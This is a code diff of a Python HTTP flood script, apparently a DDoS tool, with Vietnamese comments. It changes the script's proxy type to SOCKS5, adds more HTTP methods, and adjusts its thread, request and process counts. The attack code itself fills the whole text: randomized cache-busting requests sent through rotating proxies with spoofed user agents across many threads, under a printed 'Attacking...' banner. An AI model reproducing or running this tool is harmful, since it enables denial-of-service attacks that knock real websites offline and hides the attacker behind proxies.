@@ -80,17 +80,17 @@ def makeRequests(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH):
     while 1:
         _PROXY = random.choice(_PROXIES)
         _USERAGENT = random.choice(_USERAGENTS)
-        a22=['GET ','HEAD ','POST ']
+        a22=['GET ','HEAD ','POST ','OPTION ','PUT ','DELETE ']
         a321=random.choice(a22)
         _HEADERS = a321 + _PATH + randomParams() + " HTTP/1.3\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://google.com/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
         _PROXY = _PROXY.strip()
         try:
-            proxyDialer = Proxy.from_url('socks4://' + _PROXY) # Thay đổi socks4 thành socks5 nếu dùng socks5 và ngược lại
+            proxyDialer = Proxy.from_url('socks5://' + _PROXY) # Thay đổi socks4 thành socks5 nếu dùng socks5 và ngược lại
             conn = proxyDialer.connect(dest_host=_HOST, dest_port=_PORT)
             if _PORT == 443:
                 conn = ssl.create_default_context().wrap_socket(conn, server_hostname=_HOST)
             try:
-                for ifghhgf in range(1,200):
+                for ifghhgf in range(1,64):
                     conn.send(_HEADERS.encode())
 
                 conn.close()
@@ -107,11 +107,11 @@ def main():
     _USERAGENTS = getUserAgents(10000)
     _PROXIES = readLines(_FILE)
     while True:
-        for hahh in range(10000):
+        for hahh in range(1000):
                 thread = threading.Thread(target=makeRequests, args=(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH, ),daemon=True)
                 thread.start()
         time.sleep(60) # Thời gian DDoS (s)
 import multiprocessing
 print("Attacking...")
-for i in range(0,2):
+for i in range(0,3):
     multiprocessing.Process(target=main).start()
